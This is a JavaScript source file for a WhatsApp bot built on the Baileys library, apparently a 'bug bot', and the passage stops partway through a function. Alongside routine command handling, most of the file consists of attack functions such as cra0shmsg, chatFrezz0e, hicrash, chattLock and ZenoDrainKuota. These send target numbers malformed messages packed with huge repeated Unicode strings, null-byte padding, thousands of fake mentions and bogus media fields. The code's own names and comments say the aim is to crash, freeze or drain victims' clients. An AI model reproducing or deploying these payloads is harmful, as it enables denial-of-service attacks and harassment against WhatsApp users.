process.on('uncaughtException', console.error)
require("./config")
const { generateMessageID, generateMessageIDV2, WA_DEFAULT_EPHEMERAL, encodeSignedDeviceIdentity, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const path = require('path')
//const express = require('express');
const ms = require('ms');
const os = require('os')
 
/*const app = express();
const PORT = process.env.PORT || 3000;*/

module.exports = async (XeonBotInc, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib2/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (XeonBotInc.user.id.split(':')[0]+'@s.whatsapp.net' || XeonBotInc.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...(global.db.data.owners || [])].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isDeveloper = (m && m.sender && (global.db.data.owners || []).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isReact = m.message.reactionMessage ? true : false 

//===============[DATABASE]=====================\\
		try {
			let isNumber = x => typeof x === 'number' && !isNaN(x)
			let user = global.db.data.users[m.sender]
			if (typeof user !== 'object') global.db.data.users[m.sender] = {}
			if (user) {
				if (!isNumber(user.premiumExpiry)) user.premiumExpiry = 0
			} else global.db.data.users[m.sender] = {
				premiumExpiry: 0
			}
			
			let setting = global.db.data.settings[botNumber]
			if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
            if (!('antiswview' in setting)) setting.antiswview = false
            } else global.db.data.settings[botNumber] = {
               antiswview: false,
            }
		} catch (e) {
			console.log(e)
		}
		//=====\\
const cd = require('./lib2/countdown')
let usersdb = global.db.data.users
fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2))
const isPremium = isCreator ? true : cd.isPremium(usersdb, m.sender)
const isRentBotUser = isDeveloper ? true : cd.isPremium(usersdb, m.sender)
//====================================\\
//bug
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏") + "\n\n\n";
    jidds = [];
    xeontex += "*~@201507151697~*\n*🦄*\n*~@919366316018~*\n".repeat(10200);
    jidds.push("201507151697@s.whatsapp.net", "919366316018@s.whatsapp.net");
//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const { xeontext11 } = require('./69/xeontext11')
const { xeonbeta1, xeonbeta2, xeonyx } = require("./69/xeontext13.js")
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)
// No Need to Do Anything If You Don't Want Errors

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
 
 function sendMessageWithMentions2(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363425675094922@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/8c1rds.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  } else {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363425675094922@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/8c1rds.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  }
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//group chat msg by xeon
const replygcxeon2 = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363425675094922@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/8c1rds.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: true
}
}
                        }, {quoted:m})

}

const replygcxeon = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363425675094922@newsletter",
}
}
                        }, {quoted:m})

}
   
//self public
if (!XeonBotInc.public) {
if (!isCreator) return
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('XeonBug21.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Sorry, the command you gave is wrong. Maybe this is what you mean:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
replygcxeon(response)
}}   
//==============================================================\\
    async function FcContacNew(target) {
  var crashcontack = {
    contactMessage: {
        contextInfo: {
          interactiveMessage: {
            body: {
            text: "\u0000",
            mimetype: "audio/mpeg"
          }
        }
      }
    } 
  };
  
  await XeonBotInc.relayMessage(
    target,
    crashcontack,
    { messageId: null }
  )

  await XeonBotInc.relayMessage(
    target,
    {
      sendPaymentMessage: {
        currencyCodeIso4217: "IDR",
        requestFrom: target,
        expiryTimestamp: null,
      }
    },
    {
      participant: { jid: target }
    }
  )
}
 async function cra0shmsg(target) {
    try {
        const interactivePayload = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    jpegThumbnail: null
                },
                contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    conversionSource: "porn",
                    conversionData: crypto.randomBytes(16),
                    conversionDelaySeconds: 9999,
                    forwardingScore: 999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "Kornth",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "Telegram@B_o_d_a1FR null 🦠"
                    },
                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },
                    expiration: -99999,
                    ephemeralSettingTimestamp: Date.now(),
                    ephemeralSharedSecret: crypto.randomBytes(16),
                    entryPointConversionSource: "WhatsaApp",
                    entryPointConversionApp: "WhatsApp",
                    actionLink: {
                        url: "t.me/Kornth_i",
                        buttonTitle: "action_button"
                    },
                    disappearingMode: {
                        initiator: 1,
                        trigger: 2,
                        initiatorDeviceJid: target,
                        initiatedByMe: true
                    },
                    groupSubject: "Telegram@B_o_d_a1FR 🦠",
                    parentGroupJid: "0@g.us",
                    trustBannerType: "X",
                    trustBannerAction: 99999,
                    isSampled: true,
                    externalAdReply: {
                        title: "Telegram@B_o_d_a1FR 🦠",
                        mediaType: 2,
                        renderLargerThumbnail: false,
                        showAdAttribution: false,
                        containsAutoReply: false,
                        body: "Ai Kornth ",
                        thumbnail: null,
                        sourceUrl: "t.me/Kornth_i",
                        sourceId: "9T7A4M1A",
                        ctwaClid: "ctwaClid",
                        ref: "ref",
                        clickToWhatsappCall: true,
                        ctaPayload: "ctaPayload",
                        disableNudge: true,
                        originalImageUrl: null
                    },
                    featureEligibilities: {
                        cannotBeReactedTo: true,
                        cannotBeRanked: true,
                        canRequestFeedback: true
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "0@newsletter",
                        serverMessageId: 1,
                        newsletterName: `Crash Kornth ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                        contentType: 3,
                        accessibilityText: "Telegram@B_o_d_a1FR 🦠"
                    },
                    statusAttributionType: 2,
                    utm: {
                        utmSource: "XsSource",
                        utmCampaign: "XsCampaign"
                    }
                },
                body: {
                    text: "Telegram@B_o_d_a1FR 🦠"
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "payment_method",
                        buttonParamsJson: `{}`
                    }]
                }
            }
        };

        const msg1 = generateWAMessageFromContent(target, interactivePayload, {});
        await XeonBotInc.relayMessage(target, msg1.message, { messageId: msg1.key.id });

        const paymentPayload = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'USD',
                requestFrom: target,
                expiryTimestamp: null,
                contextInfo: {
                    remoteJid: " S ",
                    isForwarded: true,
                    forwardingScore: 979,
                    externalAdReply: {
                        title: " ⁖Telegram@B_o_d_a1FR system 🦠",
                        body: "Telegram@B_o_d_a1FR 🦠",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewType: "VIDEO",
                        sourceUrl: "VIP_1XB",
                        mediaUrl: "VIP_1XB",
                        showAdAttribution: true,
                    }
                }
            }
        };

        await XeonBotInc.relayMessage(target, paymentPayload, {
            participant: { jid: target },
            quoted: null,
            userJid: null,
            messageId: null
        });
        
    } catch (err) {
        console.error("Error", err);
    }
}  
    
    
    
    async function chatFrezz0e(target) {
    try {
        for (let s = 0; s < 1; s++) {
            const stickerMessage = generateWAMessageFromContent(
                target,
                proto.Message.fromObject({
                    botInvokeMessage: {
                        message: {
                            messageContextInfo: {
                                messageSecret: crypto.randomBytes(32),
                                deviceListMetadata: {
                                    senderKeyIndex: 0,
                                    senderTimestamp: Date.now(),
                                    recipientKeyIndex: 0
                                }
                            },
                            stickerPackMessage: {
                                stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
                                name: "XinvasionX" + "𑇂𑆵𑆴𑆿".repeat(50000),
                                publisher: "t.me/johnleosm1th",
                                stickers: [
                                    {
                                        fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "kmgU36CKofP+dXww1B7TVvTtQLK9CEuWbPYd9ABRtAw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "XZz6gF1lXcyGRjz1k6nrv2xW8y2L9MofMpsmlFZIMgY=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "iYjIgEp2J/4bF2jDJiEThzU5uNVd3ArB4eXmmr8JG5M=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "wLfOdZJ3/jE8EdS+rQDNpjMn9i+jrsCPc3DnfrpbEao=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "B4aUTYO1xHj2VwCeNgFkchqtD5lZ/59omLb5bi5NvOw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "lsS7uO7IqZJ8PQSoDYDzx0ZCyF+e6hTMEobkt1f8eA0=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "A2PvEWo9tBZupS1V1YXKJ5iwfSRdrwlmceNdy4UksR8=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "HDV3jx/hSV5OJ+bLx36+dnZ+Br4Mkr8X5KqRL0aI2Xo=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    }
                                ],
                                fileLength: "8020935",
                                fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
                                fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
                                mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
                                directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc",
                                contextInfo: { 
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 50 }, () =>
                                            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                        )
                                    ]
                                },
                                packDescription: "",
                                mediaKeyTimestamp: "1749506440",
                                trayIconFileName: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8.png",
                                thumbnailHeight: 252,
                                thumbnailWidth: 252,
                                stickerPackSize: "15000000000",
                                stickerPackOrigin: "USER_CREATED"
                            }
                        }
                    }
                }),
                { userJid: target }
            );

            await XeonBotInc.relayMessage(target, stickerMessage.message, { 
                messageId: stickerMessage.key.id,
                participant: { jid: target }
            });
            await sleep(100);
        }
    } catch (e) {
        console.error(e);
    }
}
    
    
    async function hicrash(target) {
    await XeonBotInc.relayMessage(target, {
        botForwardedMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "السلام عليكم",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, {});
}
    
    
    
    
   async function chattLock(target) {
  await XeonBotInc.relayMessage(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/598158642_864391896084426_4630997952681591297_n.enc?ccb=11-4&oh=01_Q5Aa3QHlNTSpRKXxoGo5J-b6-gw7M1pvlGuvoi6yp2pJOjF0ew&oe=695F32D4&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "fY6QRZgi0BMaRIZRQdtWDKg5tXFT+KPGcqpkefkqvGI=",
      fileLength: 999999999,
      seconds: 72050829,
      mediaKey: "Xpj7Tb8UPXDj/RqeDS4QHJBJtyCtXasmP204/v6pXY4=",
      height: 9999,
      width: 9999,
      fileEncSha256: "dUkjp/6OmUdRsARecsHRPHo/TdQ9HfwaJhYrseE07U8=",
      directPath: "/v/t62.7161-24/598158642_864391896084426_4630997952681591297_n.enc?ccb=11-4&oh=01_Q5Aa3QHlNTSpRKXxoGo5J-b6-gw7M1pvlGuvoi6yp2pJOjF0ew&oe=695F32D4&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1765260387,
      caption: "👁‍🗨⃟꙰。⌁ 𝟕𝐞𝐩 ͡𝐩𝐞𝐥 ⃰͜𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝   ⃟꙰👁‍🗨", 
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        statusSourceType: "MUSIC_STANDALONE",
        statusAttributions: [
          {
            type: "STATUS_MENTION",
            music: {
              authorName: "",
              songId: "1137812656623908",
              title: "𑲱👁‍🗨꙰⃟".repeat(10000),
              author: "𑲱👁‍🗨꙰⃟".repeat(10000),
              artistAttribution: "https://t.me/Notfound_Comander",
              isExplicit: true
            }
          }
        ]
      },
      streamingSidecar: "ifzqbbi6VQrr2qWUVcibCLLD5MublGIUI7VQWllrtSH0Oy9Oom8Fsw==",
      thumbnailDirectPath: "/v/t62.36147-24/597931020_1114136300619238_2132267882477762526_n.enc?ccb=11-4&oh=01_Q5Aa3QE3WwujMWlYXtHm0OsWvWU7G2iNPANw9Cpt64aOcOvNrg&oe=695F14B4&_nc_sid=5e03e0",
      thumbnailSha256: "ewOlFHMaQjWVM2MIHgdLESHC9lTe8wqHoRl5StiLkhM=",
      thumbnailEncSha256: "Vf7tqUV/U7cF064u4mVf9/b78ud+Ds3OS2AUwPOs5xE=",
      annotations: [
        {
          polygonVertices: [
            {
              x: 0.04808333143591881,
              y: 0.3758828043937683
            },
            {
              x: 0.9397777915000916,
              y: 0.3758828043937683
            },
            {
              x: 0.9397777915000916,
              y: 0.6241093873977661
            },
            {
              x: 0.04808333143591881,
              y: 0.6241093873977661
            }
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMessage: {
              stanzaId: "AC2FA3391836A5F431C9048A1146D3B5",
              message: {
                extendedTextMessage: {
                  text: "7eppeli.pdf",
                  previewType: "NONE",
                  inviteLinkGroupTypeV2: "DEFAULT"
                },
                messageContextInfo: {
                  messageSecret: "/M7rquUfS6CESB44pG4gkIEnJXmWCj0TWplGd5anYpI=",
                  messageAssociation: {
                    associationType: 16,
                    parentMessageKey: {
                      remoteJid: target,
                      fromMe: false,
                      id: "AC911EFEDA42DEA4586C4BB8C2814563",
                      participant: XeonBotInc.user.id
                    }
                  }
                }
              }
            }
          },
          embeddedAction: true
        },
        {
          polygonVertices: [
            {
              x: 0.2779604196548462,
              y: 0.3697652220726013
            },
            {
              x: 0.6993772983551025,
              y: 0.43257278203964233
            },
            {
              x: 0.6015534996986389,
              y: 0.6402503848075867
            },
            {
              x: 0.180136576294899,
              y: 0.5774427652359009
            }
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "1906813674047253",
              songId: "1137812656623908",
              author: "𑲱👁‍🗨꙰⃟".repeat(10000),
              title: "𑲱👁‍🗨꙰⃟".repeat(10000),
              artworkDirectPath: "/v/t62.76458-24/598391103_3273009980213184_2759326202399655865_n.enc?ccb=11-4&oh=01_Q5Aa3QGnx-UJjjZjgAcBWAO2Z_fjAVSkr6_6Trx2fPX0bUWq_Q&oe=695F194E&_nc_sid=5e03e0",
              artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
              artworkEncSha256: "RxkYiV5YBTTkodlBT20qVHazbrBipHBCLb5t9BWuaXo=",
              artistAttribution: "https://t.me/Notfound_Comander",
              countryBlocklist: "UlU=",
              isExplicit: true,
              artworkMediaKey: "GuNInntcRnyNiYcZ28Ym4g8OeZz7JbNBHl6tPOL5BBA="
            }
          },
          embeddedAction: true
        }
      ]
    }
  }, { 
    participant: { jid:target }
  })
}
    async function ZenoDelayNewBeta(target, ptcp = true) {
  const VariabelJid = "0@s.whatsapp.net";
  const imageMsg = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "99999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
    caption: "\u0000".repeat(104500),
  };

  let msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        albumMessage: {
          expectedImageCount: 666,
          expectedVideoCount: 0,
          items: [
            { 
              imageMessage: imageMsg 
            }
          ],
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, 
              () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            stanzaId: "1234567890ABCDEF",
            businessMessageForwardInfo: {
              businessOwnerJid: VariabelJid,
            },
          },
        },
      },
    },
  }, {});
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ? 
    { 
      messageId: msg.key.id, 
      participant: { jid: target } 
    } : { messageId: msg.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝗫 - 𝗭 𝗘 𝗡 𝗢", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target } 
    } : { messageId: payload.key.id }
  );
}
    
    async function ZenoDrainKuota(target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target } 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
